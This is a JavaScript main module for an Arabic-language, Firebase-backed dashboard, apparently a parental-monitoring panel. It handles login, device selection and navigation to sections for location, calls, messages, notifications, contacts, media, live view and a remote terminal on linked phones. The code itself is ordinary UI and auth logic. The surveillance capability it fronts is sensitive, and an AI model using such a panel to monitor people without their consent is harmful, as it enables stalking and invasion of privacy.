import {
  signInWithEmailAndPassword,
  createUserWithEmailAndPassword,
  signOut,
  onAuthStateChanged,
  updateProfile,
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
import { doc, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
import { auth, db } from "./firebase.js";
import { h, toast, modal, emptyState, toDate, timeAgo } from "./util.js";
import { createFirestoreProvider, createDemoProvider } from "./data.js";
import { render as renderOverview } from "./sections/overview.js";
import { render as renderLocation } from "./sections/location.js";
import { render as renderComms } from "./sections/comms.js";
import { render as renderMedia } from "./sections/media.js";
import { render as renderLive } from "./sections/live.js";
import { render as renderTerminal } from "./sections/terminal.js";
import { render as renderCombined, PANELS } from "./sections/combined.js";

const PANEL_IDS = PANELS.map((p) => p.id);

const NAV = [
  { id: "overview", title: "نظرة عامة", icon: "📊" },
  { id: "location", title: "الموقع", icon: "📍" },
  { id: "calls", title: "المكالمات", icon: "📞" },
  { id: "messages", title: "الرسائل", icon: "💬" },
  { id: "notifications", title: "الإشعارات", icon: "🔔" },
  { id: "contacts", title: "جهات الاتصال", icon: "👤" },
  { id: "media", title: "الوسائط", icon: "🖼️" },
  { id: "live", title: "مباشر", icon: "🎥" },
  { id: "terminal", title: "التريمينال", icon: "⌨️" },
  { id: "combined", title: "عرض مدمج", icon: "🧩" },
];

const SECTIONS = {
  overview: renderOverview,
  location: renderLocation,
  calls: (c, ctx) => renderComms(c, { ...ctx, filter: "calls" }),
  messages: (c, ctx) => renderComms(c, { ...ctx, filter: "messages" }),
  notifications: (c, ctx) => renderComms(c, { ...ctx, filter: "notifications" }),
  contacts: (c, ctx) => renderComms(c, { ...ctx, filter: "contacts" }),
  media: renderMedia,
  live: renderLive,
  terminal: renderTerminal,
};

const AUTH_ERRORS = {
  "auth/invalid-email": "البريد الإلكتروني غير صالح",
  "auth/user-not-found": "لا يوجد حساب بهذا البريد الإلكتروني",
  "auth/wrong-password": "كلمة المرور غير صحيحة",
  "auth/invalid-credential": "بيانات الدخول غير صحيحة",
  "auth/email-already-in-use": "البريد الإلكتروني مستخدم بالفعل",
  "auth/weak-password": "كلمة المرور ضعيفة (6 أحرف على الأقل)",
  "auth/too-many-requests": "تم تقييد المحاولات مؤقتاً، حاول لاحقاً",
  "auth/network-request-failed": "تعذر الاتصال بالشبكة",
  "auth/operation-not-allowed": "طريقة الدخول هذه غير مفعّلة في Firebase",
  "auth/user-disabled": "تم تعطيل هذا الحساب",
};

const $ = (id) => document.getElementById(id);

const state = {
  user: null,
  devices: [],
  allDevices: [],
  staleDevices: [],
  deviceId: null,
  provider: null,
  nav: NAV.some((n) => n.id === localStorage.getItem("kids.nav")) ? localStorage.getItem("kids.nav") : "overview",
  combined: PANEL_IDS,
  destroy: null,
};

try {
  const c = JSON.parse(localStorage.getItem("kids.combined") || "null");
  if (Array.isArray(c)) {
    const valid = c.filter((id) => PANEL_IDS.includes(id));
    if (valid.length) state.combined = valid;
  }
} catch { /* تجاهل */ }

function init() {
  state.provider = localStorage.getItem("kids.demo") === "1" ? createDemoProvider() : createFirestoreProvider();
  buildNav();
  bindAuth();
  bindTopbar();
  onAuthStateChanged(auth, (user) => {
    state.user = user;
    if (user) {
      $("userEmail").textContent = user.displayName || user.email || "";
      showApp();
      bootstrap();
    } else {
      showAuth();
    }
  });
}

function buildNav() {
  const nav = $("nav");
  nav.innerHTML = "";
  for (const item of NAV) {
    const btn = h("button", { class: "nav-item", type: "button", "data-nav": item.id, title: item.title }, [
      h("span", { class: "nav-icon", text: item.icon }),
      h("span", { class: "nav-label", text: item.title }),
    ]);
    btn.addEventListener("click", () => {
      state.nav = item.id;
      localStorage.setItem("kids.nav", item.id);
      updateNavActive();
      renderCurrent();
    });
    nav.append(btn);
  }
  updateNavActive();
}

function updateNavActive() {
  document.querySelectorAll(".nav-item").forEach((b) => {
    b.classList.toggle("active", b.dataset.nav === state.nav);
  });
}

function bindAuth() {
  $("tabLogin").addEventListener("click", () => switchAuthTab("login"));
  $("tabSignup").addEventListener("click", () => switchAuthTab("signup"));
  $("loginForm").addEventListener("submit", (e) => { e.preventDefault(); doAuth("login"); });
  $("signupForm").addEventListener("submit", (e) => { e.preventDefault(); doAuth("signup"); });
}

function bindTopbar() {
  const demoSwitch = $("demoSwitch");
  demoSwitch.checked = state.provider.mode === "demo";
  demoSwitch.addEventListener("change", async () => {
    localStorage.setItem("kids.demo", demoSwitch.checked ? "1" : "0");
    state.provider = demoSwitch.checked ? createDemoProvider() : createFirestoreProvider();
    await bootstrap();
  });

  $("deviceSelect").addEventListener("change", (e) => {
    state.deviceId = e.target.value || null;
    if (state.deviceId && state.user) localStorage.setItem("kids.device." + state.user.uid, state.deviceId);
    renderCurrent();
  });

  $("logoutBtn").addEventListener("click", async () => {
    try { await signOut(auth); } catch { /* تجاهل */ }
  });

  const cleanup = $("cleanupBtn");
  if (cleanup) {
    cleanup.addEventListener("click", async () => {
      const list = (state.staleDevices || []).filter((d) => d.id !== state.deviceId);
      if (!list.length) { toast("لا توجد أجهزة قديمة"); return; }
      const ok = await modal({
        title: "حذف الأجهزة القديمة",
        message: `سيتم حذف ${list.length} جهاز قديم/مكرر مع بياناته: ` +
          list.map((d) => d.name).join("، "),
        okText: "حذف",
        danger: true,
      });
      if (!ok) return;
      for (const d of list) {
        try { await state.provider.deleteDevice(state.user.uid, d.id); } catch { /* تجاهل */ }
      }
      toast("تم حذف الأجهزة القديمة");
      await bootstrap();
    });
  }
}

function switchAuthTab(tab) {
  $("tabLogin").classList.toggle("active", tab === "login");
  $("tabSignup").classList.toggle("active", tab === "signup");
  $("loginForm").classList.toggle("hidden", tab !== "login");
  $("signupForm").classList.toggle("hidden", tab !== "signup");
  hideAuthError();
}

async function doAuth(kind) {
  hideAuthError();
  const email = $(kind === "login" ? "loginEmail" : "signupEmail").value.trim();
  const pass = $(kind === "login" ? "loginPass" : "signupPass").value;
  const name = $("signupName").value.trim();

  if (!email || !pass) { showAuthError("يرجى إدخال البريد الإلكتروني وكلمة المرور"); return; }
  if (kind === "signup" && pass.length < 6) { showAuthError("كلمة المرور يجب أن تكون 6 أحرف على الأقل"); return; }

  setAuthLoading(true);
  try {
    if (kind === "login") {
      await signInWithEmailAndPassword(auth, email, pass);
    } else {
      const cred = await createUserWithEmailAndPassword(auth, email, pass);
      if (name) { try { await updateProfile(cred.user, { displayName: name }); } catch { /* تجاهل */ } }
      try {
        await setDoc(doc(db, "users", cred.user.uid), {
          email, name: name || "", createdAt: serverTimestamp(),
        }, { merge: true });
      } catch { /* تجاهل: قد تمنع القواعد الكتابة */ }
    }
  } catch (e) {
    showAuthError(mapAuthError(e));
  } finally {
    setAuthLoading(false);
  }
}

function mapAuthError(e) {
  const code = e?.code || "";
  return AUTH_ERRORS[code] || "حدث خطأ غير متوقع، حاول مرة أخرى";
}

function showAuthError(msg) {
  const box = $("authError");
  box.textContent = msg;
  box.classList.remove("hidden");
}

function hideAuthError() {
  $("authError").classList.add("hidden");
}

function setAuthLoading(on) {
  document.querySelectorAll(".auth-form button[type=submit]").forEach((b) => {
    b.disabled = on;
    b.textContent = on ? "جارٍ..." : (b.closest("#signupForm") ? "إنشاء الحساب" : "دخول");
  });
}

function showApp() {
  $("authView").classList.add("hidden");
  $("appView").classList.remove("hidden");
}

function showAuth() {
  $("appView").classList.add("hidden");
  $("authView").classList.remove("hidden");
}

async function bootstrap() {
  const sel = $("deviceSelect");
  sel.innerHTML = "";
  let devices = [];
  try { devices = await state.provider.listDevices(state.user.uid); } catch { devices = []; }

  // ترتيب حسب آخر ظهور + إخفاء الأجهزة القديمة/المكررة (أكثر من 7 أيام)
  const withDate = devices.map((d) => ({ d, at: toDate(d.lastSeen)?.getTime() || 0 }));
  withDate.sort((a, b) => b.at - a.at);
  const stale = withDate.filter((x) => x.at < Date.now() - 7 * 24 * 3600 * 1000);
  let visible = withDate.filter((x) => x.at >= Date.now() - 7 * 24 * 3600 * 1000).map((x) => x.d);
  if (!visible.length && withDate.length) visible = [withDate[0].d];
  const savedId = localStorage.getItem("kids.device." + state.user.uid);
  if (savedId && !visible.some((d) => d.id === savedId)) {
    const found = withDate.find((x) => x.d.id === savedId);
    if (found) visible.push(found.d);
  }

  state.devices = visible;
  state.allDevices = withDate.map((x) => x.d);
  state.staleDevices = stale.map((x) => x.d);

  setSync(
    state.provider.mode === "demo" ? "وضع تجريبي" : "متصل بـ Firebase",
    state.provider.mode === "demo" ? "warn" : "ok",
  );

  const cleanup = $("cleanupBtn");
  if (cleanup) {
    cleanup.textContent = state.staleDevices.length ? `🧹 ${state.staleDevices.length}` : "🧹";
    cleanup.disabled = !state.staleDevices.length || state.provider.mode === "demo";
  }

  if (!visible.length) {
    state.deviceId = null;
    sel.append(h("option", { value: "", text: "لا توجد أجهزة" }));
    renderCurrent();
    return;
  }

  const saved = localStorage.getItem("kids.device." + state.user.uid);
  state.deviceId = visible.some((d) => d.id === saved) ? saved : visible[0].id;
  for (const d of visible) {
    const when = toDate(d.lastSeen);
    const label = when ? `${d.name} · ${timeAgo(d.lastSeen)}` : d.name;
    sel.append(h("option", { value: d.id, text: label }));
  }
  sel.value = state.deviceId;
  renderCurrent();
}

function setSync(text, mode) {
  const el = $("syncStatus");
  el.innerHTML = "";
  el.append(h("span", { class: "dot " + (mode || "") }), h("span", { text }));
}

function renderCurrent() {
  if (state.destroy) {
    try { state.destroy(); } catch { /* تجاهل */ }
    state.destroy = null;
  }
  const main = $("main");
  main.innerHTML = "";

  if (!state.deviceId) {
    main.append(emptyState(
      "📵",
      "لا توجد أجهزة مرتبطة",
      "اربط جهازاً من التطبيق أولاً، أو فعّل «الوضع التجريبي» من الشريط العلوي لاستعراض لوحة التحكم.",
    ));
    return;
  }

  const ctx = {
    uid: state.user.uid,
    deviceId: state.deviceId,
    device: state.devices.find((d) => d.id === state.deviceId) || null,
    data: state.provider,
    toast,
    modal,
    compact: false,
  };

  if (state.nav === "combined") {
    state.destroy = renderCombined(main, ctx, state.combined, (sel) => {
      state.combined = sel;
      localStorage.setItem("kids.combined", JSON.stringify(sel));
    });
  } else {
    state.destroy = SECTIONS[state.nav](main, ctx);
  }
  main.scrollTop = 0;
}

if ("serviceWorker" in navigator) {
  window.addEventListener("load", () => {
    navigator.serviceWorker.register("sw.js").catch(() => {});
  });
}

init();
